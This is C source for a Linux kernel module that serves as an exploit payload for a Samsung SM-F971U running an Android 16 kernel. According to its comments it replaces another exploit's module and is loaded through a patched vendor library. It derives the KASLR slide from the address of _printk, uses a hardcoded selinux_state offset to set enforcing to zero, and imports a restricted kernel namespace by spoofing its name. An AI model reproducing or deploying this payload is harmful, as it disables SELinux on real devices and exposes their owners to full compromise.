// SPDX-License-Identifier: GPL-2.0
/*
 * selinux_off — h8q (SM-F971U) SELinux permissive flipper.
 *
 * Replacement payload for LSPromise's dirtyfrag.ko (Pixel-targeted, refuses
 * to load here). Loaded by vendor_modprobe via init_module on the patched
 * vendor lib; sets selinux_state.enforcing = 0.
 *
 * Target: 6.12.58-android16-6-pab9584b-abogkiF971USQU1AZFW-4k
 *   _printk        = base + 0xceddc    (exported anchor; runtime slide source)
 *   selinux_state  = base + 0x28ebc80  (enforcing @ +0, per BTF)
 */
#include <linux/init.h>
#include <linux/module.h>

#define KIMAGE_BASE       0xffffffc080000000UL
#define OFF_PRINTK        0xceddcUL
#define OFF_SELINUX_STATE 0x28ebc80UL

extern int _printk(const char *fmt, ...); /* EXPORT_SYMBOL; resolved by the loader */

static int __init selinux_off_init(void)
{
	unsigned long slide = (unsigned long)&_printk - (KIMAGE_BASE + OFF_PRINTK);
	volatile unsigned char *enforcing =
		(volatile unsigned char *)(KIMAGE_BASE + OFF_SELINUX_STATE + slide);
	unsigned char before = *enforcing;

	*enforcing = 0;
	pr_info("selinux_off: enforcing %u -> %u (slide=%#lx)\n",
		before, *enforcing, slide);
	return 0;
}

static void __exit selinux_off_exit(void)
{
	pr_info("selinux_off: exit\n");
}

module_init(selinux_off_init);
module_exit(selinux_off_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("SELinux permissive flipper for h8q");
MODULE_AUTHOR("slapah");
MODULE_IMPORT_NS("VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver");
